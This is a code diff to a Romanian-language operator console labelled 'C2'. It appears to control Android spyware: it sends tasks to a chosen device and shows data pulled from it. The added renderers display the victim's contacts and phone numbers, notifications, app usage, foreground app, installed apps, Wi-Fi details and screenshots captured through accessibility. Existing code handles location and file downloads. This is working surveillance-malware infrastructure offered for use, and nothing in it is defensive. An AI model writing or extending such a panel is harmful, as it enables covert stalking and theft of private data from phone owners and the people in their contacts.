@@ -1653,6 +1653,68 @@ button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
 .frow .fpath{word-break:break-all;color:var(--txt)}
 .fbase{font-size:11px;color:var(--dim2);margin-bottom:4px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
 @media(max-width:880px){.split,.split.reswide{grid-template-columns:1fr}.pane-scroll{max-height:48vh}}
+/* ── Per-action result renderers ── */
+.kv-grid{display:grid;grid-template-columns:120px 1fr;gap:3px 10px;font-size:13px;margin:6px 0}
+.kv-grid .k{color:var(--dim2);font-size:10px;text-transform:uppercase;letter-spacing:.04em;padding:2px 0}
+.kv-grid .v{padding:2px 0;word-break:break-all}
+.section-title{font-size:10px;color:var(--dim2);letter-spacing:.1em;font-weight:700;text-transform:uppercase;margin:12px 0 4px;padding-bottom:2px;border-bottom:1px solid var(--line)}
+.section-title:first-child{margin-top:0}
+.progress-bar{height:4px;background:var(--panel2);border-radius:2px;overflow:hidden}
+.progress-bar .fill{height:100%;border-radius:2px;background:var(--green);transition:width .3s}
+.progress-bar .fill.warn{background:var(--amber)}
+.progress-bar .fill.crit{background:var(--red)}
+.app-row{display:flex;align-items:center;gap:8px;padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.04);font-size:13px}
+.app-row:last-child{border-bottom:none}
+.app-row:hover{background:rgba(255,255,255,.02)}
+.app-ico{width:28px;height:28px;border-radius:6px;flex:none;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#fff}
+.app-name{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:600}
+.app-sub{font-size:10px;color:var(--dim2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+.app-meta{font-size:11px;color:var(--dim2);flex:none}
+.badge.sys{background:rgba(91,155,213,.12);color:var(--blue);font-size:10px;padding:1px 6px}
+.badge.user{background:rgba(255,179,0,.12);color:var(--amber);font-size:10px;padding:1px 6px}
+.contact-row{display:flex;align-items:center;gap:10px;padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.04);font-size:13px}
+.contact-row:last-child{border-bottom:none}
+.contact-row .avatar{width:32px;height:32px;border-radius:50%;flex:none;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#fff}
+.contact-row .c-name{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:600}
+.contact-row .c-num{font-size:12px;color:var(--dim);flex:none;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+.notif-card{padding:8px 10px;border-left:3px solid var(--line);margin-bottom:6px;background:var(--panel2);border-radius:0 6px 6px 0}
+.notif-card .n-title{font-weight:600;font-size:13px}
+.notif-card .n-text{font-size:12px;color:var(--dim);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.notif-card .n-meta{font-size:10px;color:var(--dim2);margin-top:2px}
+.usage-bar-row{display:flex;align-items:center;gap:8px;padding:3px 0;font-size:12px}
+.usage-bar-row .ub-name{width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:none}
+.usage-bar-row .ub-bar{flex:1;height:6px;background:var(--panel2);border-radius:3px;overflow:hidden}
+.usage-bar-row .ub-fill{height:100%;border-radius:3px;background:var(--blue)}
+.usage-bar-row .ub-time{width:60px;text-align:right;font-size:11px;color:var(--dim);flex:none}
+.page-ctrl{display:flex;align-items:center;gap:6px;margin-top:10px;flex-wrap:wrap;justify-content:center}
+.page-ctrl .page-btn{background:var(--panel2);border:1px solid var(--line);color:var(--dim);border-radius:4px;padding:3px 8px;font-size:11px;cursor:pointer;font-family:inherit}
+.page-ctrl .page-btn:hover{border-color:var(--amber);color:var(--txt)}
+.page-ctrl .page-btn.active{background:var(--amber);color:#000;border-color:var(--amber);font-weight:700}
+.page-ctrl .page-info{font-size:11px;color:var(--dim2)}
+.search-bar{display:flex;gap:6px;margin-bottom:8px}
+.search-bar input{flex:1;font-size:12px;padding:6px 8px}
+.sort-toggle{font-size:11px;color:var(--dim2);cursor:pointer;padding:2px 6px;border-radius:4px}
+.sort-toggle:hover{color:var(--amber);background:rgba(255,179,0,.1)}
+.raw-json{margin-top:8px}
+.raw-json summary{font-size:11px;color:var(--dim2);cursor:pointer;font-weight:600}
+.raw-json summary:hover{color:var(--amber)}
+.raw-json pre{margin-top:4px;max-height:200px;font-size:10px}
+.empty-state{text-align:center;padding:20px;color:var(--dim2);font-size:13px}
+.err-state{text-align:center;padding:16px;color:var(--red);font-size:13px}
+.sr-status{display:flex;align-items:center;gap:10px;padding:12px;background:var(--panel2);border-radius:8px;font-size:13px}
+.sr-status .sr-ico{font-size:24px}
+.sr-img{width:100%;border-radius:8px;border:1px solid var(--line);margin:6px 0}
+.sr-details{display:flex;gap:12px;align-items:center;margin-top:6px;font-size:12px;color:var(--dim)}
+.signal-bars{display:flex;gap:2px;align-items:flex-end;height:16px}
+.signal-bars span{width:3px;background:var(--line);border-radius:1px}
+.signal-bars span.on{background:var(--green)}
+.loading-state{display:flex;align-items:center;gap:8px;padding:10px 12px;color:var(--dim);font-size:13px;margin-bottom:6px}
+.spinner{width:14px;height:14px;border:2px solid var(--line);border-top-color:var(--amber);border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.fg-card{display:flex;align-items:center;gap:12px;padding:10px;background:var(--panel2);border-radius:8px}
+.fg-card .fg-ico{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;flex:none}
+.fg-card .fg-name{font-weight:700;font-size:14px}
+.fg-card .fg-pkg{font-size:11px;color:var(--dim2);font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
 </style></head><body>
 <nav class="nav"><a href="/admin">Admin</a><span style="color:var(--dim2)">·</span><b>C2</b></nav>
 <main>
@@ -1761,11 +1823,258 @@ function getFile(p){
 }
 function ago(ts,now){var d=now-ts;if(d<0)return"acum";if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m "+(d%60)+"s";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
 function fmtB(n){if(n==null||isNaN(n))return"";n=Number(n);if(n<1024)return n+"B";if(n<1048576)return(n/1024).toFixed(1)+"KB";return(n/1048576).toFixed(1)+"MB"}
-function fmtData(d){
+// ── Utility helpers ───────────────────────────────────────────────
+function fmtTime(ms){if(!ms||ms<=0)return"n/a";var d=new Date(Number(ms));return d.toLocaleDateString()+
+" "+d.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})}
+function fmtDur(ms){if(!ms||ms<=0)return"0s";ms=Math.round(Number(ms));if(ms<1000)return ms+"s";
+var s=Math.floor(ms/1000);if(s<60)return s+"s";var m=Math.floor(s/60);s%=60;
+if(m<60)return m+"m"+(s?" "+s+"s":"");var h=Math.floor(m/60);m%=60;
+return h+"h"+(m?" "+m+"m":"")+(s?" "+s+"s":"")}
+function pkgName(pkg){return pkg?pkg.split(".").pop()||pkg:""}
+function pkgLabel(pkg){if(!pkg)return"app";var parts=pkg.split(".").filter(function(p){return p.length>2&&!/^(com|org|net|io|app|android|google|system|core|media|provider|telephony|wifi|bluetooth|account|wallpaper|print|search|settings|nfc|permission|input|backup|dropbox)/i.test(p)});
+return parts.length?parts[parts.length-1].replace(/[._-]/g," "):pkgName(pkg)}
+function rawJson(d){return"<details class='raw-json'><summary>Detalii tehnice</summary><pre>"+esc(JSON.stringify(d,null,1).slice(0,6000))+"</pre></details>"}
+function emptyState(msg){return"<div class='empty-state'>"+esc(msg||"Date lipsă")+"</div>"}
+function errState(msg){return"<div class='err-state'>⚠ "+esc(msg||"eroare")+"</div>"}
+function avatarColor(name){if(!name)return"var(--dim2)";var c=["var(--amber)","var(--green)","var(--blue)","#C77DBA","var(--red)","#7A8BFF"];
+var h=0;for(var i=0;i<name.length;i++)h=name.charCodeAt(i)+((h<<5)-h);return c[Math.abs(h)%c.length]}
+function initials(name){if(!name)return"?";var p=name.trim().split(/\s+/);
+return p.length>=2?(p[0][0]+p[1][0]).toUpperCase():name[0].toUpperCase()}
+// ── Per-action renderers ──────────────────────────────────────────
+function renderDevice(d){
+  if(d.error)return errState(d.error);
+  var b=d.battery||{};var pct=b.pct>=0?b.pct:null;
+  var h="<div>";
+  h+="<div class='section-title'>Dispozitiv</div><div class='kv-grid'>";
+  h+="<span class='k'>Model</span><span class='v'>"+esc(d.manufacturer||"")+" "+esc(d.model||"")+"</span>";
+  h+="<span class='k'>Android</span><span class='v'>"+esc(d.release||"")+" (API "+esc(String(d.sdk||""))+")</span>";
+  h+="<span class='k'>Patch</span><span class='v'>"+esc(d.security_patch||"")+"</span>";
+  h+="</div>";
+  if(pct!=null){
+    var bc=pct>50?"":pct>20?"warn":"crit";
+    var pc=pct>50?"var(--green)":pct>20?"var(--amber)":"var(--red)";
+    h+="<div class='section-title'>Baterie</div>";
+    h+="<div style='display:flex;align-items:center;gap:8px'><span class='mono' style='font-size:14px;font-weight:700;color:"+pc+"'>"+pct+"%</span>";
+    h+="<div class='progress-bar' style='flex:1'><div class='fill "+bc+"' style='width:"+pct+"%'></div></div></div>";
+  }
+  if(d.storage_total_gb!=null&&d.storage_free_gb!=null){
+    var used=d.storage_total_gb-d.storage_free_gb;var pctS=d.storage_total_gb>0?Math.round(used/d.storage_total_gb*100):0;
+    var sc=pctS<80?"":pctS<90?"warn":"crit";
+    h+="<div class='section-title'>Stocare</div>";
+    h+="<div style='display:flex;gap:8px;align-items:center;font-size:13px'><span>"+d.storage_free_gb+" GB libere / "+d.storage_total_gb+" GB</span>";
+    h+="<div class='progress-bar' style='flex:1'><div class='fill "+sc+"' style='width:"+pctS+"%'></div></div><span class='dim'>"+pctS+"% folosit</span></div>";
+  }
+  if(d.ram_total_gb!=null){
+    h+="<div class='section-title'>Memorie</div>";
+    h+="<span style='font-size:13px'>"+d.ram_available_gb+" GB din "+d.ram_total_gb+" GB RAM disponibil</span>";
+  }
+  if(d.screen_w!=null){
+    h+="<div class='section-title'>Display</div><span style='font-size:13px'>"+d.screen_w+"×"+d.screen_h+" @ "+d.screen_dpi+" dpi</span>";
+  }
+  h+="<div class='section-title'>Conectivitate</div><div class='kv-grid'>";
+  var wOn=d.wifi_enabled==true;
+  h+="<span class='k'>WiFi</span><span class='v'>"+(wOn?"<span class='badge done'>activ</span> "+esc(d.wifi_ssid||""):d.wifi_enabled==false?"<span class='badge failed'>inactiv</span>":"—")+"</span>";
+  if(wOn&&d.wifi_ip)h+="<span class='k'>IP</span><span class='v mono' style='font-size:12px'>"+esc(d.wifi_ip)+"</span>";
+  if(wOn&&d.wifi_rssi!=null)h+="<span class='k'>Semnal</span><span class='v'>"+esc(String(d.wifi_rssi))+" dBm</span>";
+  h+="<span class='k'>Bluetooth</span><span class='v'>"+(d.bt_enabled?"on — "+esc(d.bt_name||""):"off")+"</span>";
+  if(d.sim_carrier)h+="<span class='k'>SIM</span><span class='v'>"+esc(d.sim_carrier)+" ("+esc(d.sim_state||"")+")</span>";
+  h+="</div>";
+  h+=rawJson({fingerprint:d.fingerprint,build:d.build,uid:d.uid,bssid:d.wifi_bssid});
+  h+="</div>";
+  return h;
+}
+function renderNetwork(d){
+  if(d.error)return errState(d.error);
+  if(d.connected===false)return emptyState("Nicio conexiune activă");
+  var h="<div>";
+  var isWifi=d.type&&d.type.toLowerCase().indexOf("wi-fi")>=0;
+  h+="<div class='sr-status'><span class='sr-ico'>"+(isWifi?"📶":"📱")+"</span>";
+  h+="<div><div style='font-weight:700'>"+(d.connected?"Conectat":"Deconectat")+"</div>";
+  h+="<span class='dim' style='font-size:12px'>"+esc(d.type||"")+"</span></div></div>";
+  if(d.wifi_ssid){
+    h+="<div class='kv-grid' style='margin-top:8px'>";
+    h+="<span class='k'>SSID</span><span class='v'>"+esc(d.wifi_ssid)+"</span>";
+    if(d.wifi_rssi!=null)h+="<span class='k'>Semnal</span><span class='v'>"+esc(String(d.wifi_rssi))+" dBm</span>";
+    if(d.wifi_level!=null){
+      var lvl=d.wifi_level;
+      h+="<span class='k'>Nivel</span><span class='v'><span class='signal-bars'>";
+      for(var i=0;i<5;i++)h+="<span"+(i<lvl?" class='on'":"")+" style='height:"+(4+i*3)+"px'></span>";
+      h+="</span></span>";
+    }
+    h+="</div>";
+  }
+  if(d.ip)h+="<div class='kv-grid'><span class='k'>IP</span><span class='v mono' style='font-size:12px'>"+esc(d.ip)+"</span></div>";
+  h+=rawJson(d);
+  h+="</div>";
+  return h;
+}
+function renderForeground(d){
+  if(d.error)return errState(d.error);
+  var pkg=d.pkg||"";
+  if(!pkg||pkg==="necunoscut")return emptyState("Aplicație în prim-plan nedetectată");
+  var lbl=pkgLabel(pkg);var col=avatarColor(lbl);
+  var h="<div class='fg-card'><div class='fg-ico' style='background:"+col+"'>"+esc(initials(lbl))+"</div>";
+  h+="<div><div class='fg-name'>"+esc(lbl)+"</div><div class='fg-pkg'>"+esc(pkg)+"</div></div></div>";
+  h+=rawJson(d);
+  return h;
+}
+function renderApps(d){
+  if(d.error)return errState(d.error);
+  var list=d.list||[];
+  if(!list.length)return emptyState("Niciun app găsit");
+  var h="<div>";
+  h+="<div class='search-bar'><input type='text' placeholder='Caută app…' id='appsSearch' onkeydown='if(event.key==\"Enter\")fireAppsSearch()'>";
+  h+="<button class='mini' onclick='fireAppsSearch()'>Caută</button></div>";
+  list.forEach(function(a){
+    var lbl=a.label||pkgLabel(a.pkg);
+    var col=avatarColor(lbl);
+    h+="<div class='app-row'><div class='app-ico' style='background:"+col+"' data-pkg='"+esc(a.pkg)+"'>"+esc(initials(lbl))+'</div>';
+    h+="<div style='flex:1;min-width:0'><div class='app-name'>"+esc(lbl)+"</div>";
+    h+="<div class='app-sub'>"+esc(a.pkg)+"</div></div>";
+    h+="<span class='badge "+(a.sys?"sys":"user")+"'>"+(a.sys?"SYS":"USER")+"</span>";
+    h+="<span class='app-meta'>"+esc(a.version||"")+"</span></div>";
+  });
+  if(d.total!=null){
+    var total=d.total,off=d.offset||0,lim=d.limit||100;
+    var curPage=Math.floor(off/lim)+1;var totalPages=Math.ceil(total/lim);
+    h+="<div class='page-ctrl'><span class='page-info'>"+total+" apps</span>";
+    if(off>0)h+="<button class='page-btn' onclick='fireAppsPage("+Math.max(0,off-lim)+","+lim+")'>←</button>";
+    h+="<span class='page-info'>pag. "+curPage+"/"+Math.max(1,totalPages)+"</span>";
+    if(d.has_more)h+="<button class='page-btn' onclick='fireAppsPage("+(off+lim)+","+lim+")'>→</button>";
+    h+="</div>";
+  }
+  h+=rawJson(d);
+  h+="</div>";
+  setTimeout(function(){loadAppIcons(list)},50);
+  return h;
+}
+function renderContacts(d){
+  if(d.error)return errState(d.error);
+  var list=d.list||[];
+  if(!list.length)return emptyState("Niciun contact găsit");
+  var h="<div>";
+  h+="<div class='search-bar'><input type='text' placeholder='Caută contact…' id='contSearch' onkeydown='if(event.key==\"Enter\")fireContSearch()'>";
+  h+="<button class='mini' onclick='fireContSearch()'>Caută</button></div>";
+  list.forEach(function(c){
+    var name=c.name||"(fără nume)";var col=avatarColor(name);
+    h+="<div class='contact-row'><div class='avatar' style='background:"+col+"'>"+esc(initials(name))+"</div>";
+    h+="<div class='c-name'>"+esc(name)+"</div>";
+    h+="<div class='c-num'>"+esc(c.number||"")+"</div></div>";
+    if(c.numbers&&c.numbers.length>1){
+      h+="<div style='padding:0 8px 4px 42px;font-size:11px;color:var(--dim)'>";
+      h+="<span style='cursor:pointer' onclick='var n=this.nextElementSibling;n.style.display=n.style.display==\"none\"?\"\":\"none\"'>+"+(c.numbers.length-1)+" nr.</span>";
+      h+="<div style='display:none'>";
+      c.numbers.slice(1).forEach(function(n){h+="<div class='mono'>"+esc(n)+"</div>"});
+      h+="</div></div>";
+    }
+  });
+  if(d.total!=null){
+    var total=d.total,off=d.offset||0,lim=d.limit||50;
+    var curPage=Math.floor(off/lim)+1;var totalPages=Math.ceil(total/lim);
+    h+="<div class='page-ctrl'><span class='page-info'>"+total+" contacte</span>";
+    if(off>0)h+="<button class='page-btn' onclick='fireContPage("+Math.max(0,off-lim)+","+lim+")'>←</button>";
+    h+="<span class='page-info'>pag. "+curPage+"/"+Math.max(1,totalPages)+"</span>";
+    if(d.has_more)h+="<button class='page-btn' onclick='fireContPage("+(off+lim)+","+lim+")'>→</button>";
+    h+="</div>";
+  }
+  h+=rawJson(d);
+  h+="</div>";
+  return h;
+}
+function renderRecent(d){
+  if(d.error)return errState(d.error);
+  var list=d.list||[];
+  if(!list.length)return emptyState("Nicio activitate recentă");
+  var h="<div><div class='section-title'>Activitate recentă (60 min)</div>";
+  h+="<table><tr><th>Aplicație</th><th>Ultim utilizat</th><th>În prim-plan</th></tr>";
+  list.forEach(function(x){
+    h+="<tr><td><b>"+esc(pkgLabel(x.pkg))+"</b><br><span class='dim mono' style='font-size:10px'>"+esc(x.pkg)+"</span></td>";
+    h+="<td>"+fmtTime(x.last)+"</td><td>"+fmtDur(x.time)+"</td></tr>";
+  });
+  h+="</table>"+rawJson(d)+"</div>";
+  return h;
+}
+function renderUsage(d){
+  if(d.error)return errState(d.error);
+  var list=d.list||[];
+  if(!list.length)return emptyState("Nicio date de utilizare");
+  var maxFg=0;list.forEach(function(x){var v=Number(x.fg)||0;if(v>maxFg)maxFg=v});
+  var h="<div><div class='section-title'>Utilizare 24h — top "+list.length+"</div>";
+  h+="<div style='margin-bottom:10px'>";
+  list.slice(0,10).forEach(function(x){
+    var lbl=pkgLabel(x.pkg);
+    var pct=maxFg>0?Math.max(2,Math.round((Number(x.fg)||0)/maxFg*100)):0;
+    h+="<div class='usage-bar-row'><span class='ub-name' title='"+esc(x.pkg)+"'>"+esc(lbl)+"</span>";
+    h+="<div class='ub-bar'><div class='ub-fill' style='width:"+pct+"%'></div></div>";
+    h+="<span class='ub-time'>"+fmtDur(x.fg)+"</span></div>";
+  });
+  h+="</div>";
+  h+="<table><tr><th>Aplicație</th><th>Prim-plan</th><th>Ultim utilizat</th></tr>";
+  list.forEach(function(x){
+    h+="<tr><td>"+esc(pkgLabel(x.pkg))+"<br><span class='dim mono' style='font-size:10px'>"+esc(x.pkg)+"</span></td>";
+    h+="<td>"+fmtDur(x.fg)+"</td><td>"+fmtTime(x.last)+"</td></tr>";
+  });
+  h+="</table>"+rawJson(d)+"</div>";
+  return h;
+}
+function renderNotifications(d){
+  if(d.error)return errState(d.error);
+  if(d.status==="not_authorized"){
+    return"<div class='err-state'>🔔 "+esc(d.detail||"Notification listener neactivat")+"</div>"+rawJson(d);
+  }
+  var list=d.list||[];
+  if(!list.length)return emptyState("Nicio notificări active");
+  var deduped=[];var lastKey=null;
+  list.forEach(function(n){
+    var key=(n.pkg||"")+"|"+(n.title||"")+"|"+(n.text||"");
+    if(key===lastKey&&deduped.length){deduped[deduped.length-1]._cnt=(deduped[deduped.length-1]._cnt||1)+1}
+    else{deduped.push(Object.assign({_cnt:1},n));lastKey=key}
+  });
+  var h="<div><div class='section-title'>Notificări ("+list.length+")</div>";
+  deduped.forEach(function(n){
+    h+="<div class='notif-card'>";
+    h+="<div class='n-title'>"+esc(n.title||"")+(n._cnt>1?" <span class='badge queued'>×"+n._cnt+"</span>":"")+"</div>";
+    if(n.text)h+="<div class='n-text'>"+esc(n.text)+"</div>";
+    h+="<div class='n-meta'>"+esc(pkgLabel(n.pkg))+"</div></div>";
+  });
+  h+=rawJson(d)+"</div>";
+  return h;
+}
+function renderScreenshot(d){
+  if(d.error)return errState(d.error);
+  var st=d.status||"";
+  if(st==="ok"&&d.b64){
+    return"<img class='sr-img' src='data:"+(d.ct||"image/jpeg")+';base64,"+d.b64+"'>"
+    +"<div class='sr-details'><span class='dim'>captură ecran</span></div>"
+    +rawJson({status:"ok",ct:d.ct,size_kb:Math.round((d.b64.length*0.75)/1024)});
+  }
+  if(st==="not_enabled")
+    return"<div class='sr-status'><span class='sr-ico'>🔒</span><div><b>Accesibilitate neactivată</b><div class='dim' style='font-size:12px'>"+esc(d.detail||"")+"</div></div></div>"+rawJson(d);
+  if(st==="not_connected")
+    return"<div class='sr-status'><span class='sr-ico'>⏳</span><div><b>Serviciu neconectat</b><div class='dim' style='font-size:12px'>"+esc(d.detail||"")+"</div></div></div>"+rawJson(d);
+  if(st==="capture_failed")
+    return errState("Eșec captură: "+(d.detail||"unknown"))+rawJson(d);
+  return null;
+}
+// ── New fmtData dispatcher ───────────────────────────────────────
+function fmtData(d,action){
   try{
     if(d==null||d==="")return"";
     if(typeof d==="string")return"<pre>"+esc(d.slice(0,8000))+"</pre>";
     if(typeof d!=="object")return"<pre>"+esc(String(d))+"</pre>";
+    // Per-action renderers
+    var r;
+    switch(action){
+      case "device":r=renderDevice(d);if(r)return r;break;
+      case "network":r=renderNetwork(d);if(r)return r;break;
+      case "foreground":r=renderForeground(d);if(r)return r;break;
+      case "apps":r=renderApps(d);if(r)return r;break;
+      case "contacts":r=renderContacts(d);if(r)return r;break;
+      case "recent":r=renderRecent(d);if(r)return r;break;
+      case "usage":r=renderUsage(d);if(r)return r;break;
+      case "notifications":r=renderNotifications(d);if(r)return r;break;
+      case "screenshot":r=renderScreenshot(d);if(r)return r;break;
+    }
     if(d.b64)return'<img class="shot" src="data:'+(d.ct||"image/jpeg")+';base64,'+d.b64+'">';
     if(d.lat!=null&&d.lng!=null){
       var la=Number(d.lat),ln=Number(d.lng);
@@ -1816,11 +2125,55 @@ function fmtData(d){
         return"<div class='frow'><a href='#' onclick='dl(\""+esc(k)+"\");return false'>↓ "+esc(k.split("/").pop())+"</a></div>";
       }).join("")+"</div>";
     }
-    if(d.list&&d.list.length)return"<pre>"+esc(JSON.stringify(d.list.slice(0,50),null,1).slice(0,8000))+"</pre>";
-    return"<pre>"+esc(JSON.stringify(d,null,1).slice(0,8000))+"</pre>";
+    if(d.error)return errState(d.error);
+    return rawJson(d);
   }catch(e){
-    // A malformed result must never hide the rest.
     return"<pre class='dim'>afisare indisponibilă: "+esc(String(e&&e.message||e))+"</pre>";
+  }
+}
+// ── Paged query + request correlation ───────────────────────────
+var _latestQuery=null;var _querySeq=0;
+function firePagedQuery(action,params){
+  _querySeq++;
+  var uid=selDev();if(!uid)return;
+  _latestQuery={action:action,params:params,seq:_querySeq,ts:Date.now()};
+  setResultsLoading(action);
+  api("/admin/api/c2/cmd",{method:"POST",body:JSON.stringify({uid:uid,tasks:[{action:action,params:params}]})}).catch(function(){});
+}
+function setResultsLoading(action){
+  var el=document.getElementById("results");
+  if(el){var old=document.getElementById("loadingInd");if(old)old.remove();
+    var div=document.createElement("div");div.className="loading-state";div.id="loadingInd";
+    div.innerHTML="<div class='spinner'></div>Se încarcă "+esc(action)+"…";
+    el.insertBefore(div,el.firstChild)}
+}
+function clearResultsLoading(){var el=document.getElementById("loadingInd");if(el)el.remove()}
+function isStaleResult(action,at){
+  if(!_latestQuery||_latestQuery.action!==action)return false;
+  if(!at)return false;
+  return Date.now()-at>120000;
+}
+// ── Paged query fire helpers ────────────────────────────────────
+function fireAppsSearch(){var s=document.getElementById("appsSearch");
+  if(s)firePagedQuery("apps",{search:s.value.trim(),limit:25})}
+function fireAppsPage(off,lim){var s=document.getElementById("appsSearch");
+  var p={offset:off,limit:lim};if(s&&s.value.trim())p.search=s.value.trim();
+  firePagedQuery("apps",p)}
+function fireContSearch(){var s=document.getElementById("contSearch");
+  if(s)firePagedQuery("contacts",{search:s.value.trim(),limit:25})}
+function fireContPage(off,lim){var s=document.getElementById("contSearch");
+  var p={offset:off,limit:lim};if(s&&s.value.trim())p.search=s.value.trim();
+  firePagedQuery("contacts",p)}
+// ── App icon loading ────────────────────────────────────────────
+var _iconCache=new Map();
+function loadAppIcons(apps){
+  var pkgs=[];
+  apps.forEach(function(a){if(a.pkg&&!_iconCache.has(a.pkg))pkgs.push(a.pkg)});
+  if(!pkgs.length)return;
+  for(var i=0;i<pkgs.length;i+=10){
+    (function(batch){
+      api("/admin/api/c2/cmd",{method:"POST",body:JSON.stringify({uid:selDev(),tasks:[{action:"app_icons",params:{pkgs:batch,size:48}}]})}).catch(function(){})
+    })(pkgs.slice(i,i+10));
   }
 }
 var ST={queued:["queued","ÎN COADĂ"],delivered:["delivered","LIVRATĂ"],done:["done","GATA ✓"],failed:["failed","EROARE"],timeout:["timeout","EXPIRATĂ"]};
@@ -1873,12 +2226,25 @@ async function loadDetail(){
         try{
           return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge "+(x.ok?"done":"failed")+"'>"+(x.ok?"OK":"FAIL")+"</span><span class='time mono'>"+ago(x.at,now)+"</span></div>"
             +(x.err?"<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(String(x.err).slice(0,300))+"</div>":"")
-            +"<div class='cmd-result'>"+fmtData(x.data)+"</div></div>";
+            +"<div class='cmd-result'>"+fmtData(x.data,x.action)+"</div></div>";
         }catch(e){
           return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge failed'>?</span><span class='time mono'>"+ago(x.at,now)+"</span></div><div class='cmd-result dim'>afisare indisponibilă</div></div>";
         }
       }).join("")
       :'<span class="empty">niciun rezultat</span>';
+    clearResultsLoading();
+    // Process app_icons results — replace placeholder icons
+    all.forEach(function(x){
+      if(x.action==="app_icons"&&x.ok&&x.data&&x.data.icons){
+        x.data.icons.forEach(function(ic){
+          if(ic.b64&&ic.pkg){
+            _iconCache.set(ic.pkg,ic.b64);
+            var el=document.querySelector(".app-ico[data-pkg='"+ic.pkg+"']");
+            if(el)el.innerHTML="<img src='data:image/png;base64,"+ic.b64+"' style='width:24px;height:24px;border-radius:4px'>";
+          }
+        });
+      }
+    });
   }catch(e){}
 }
 async function dl(key){
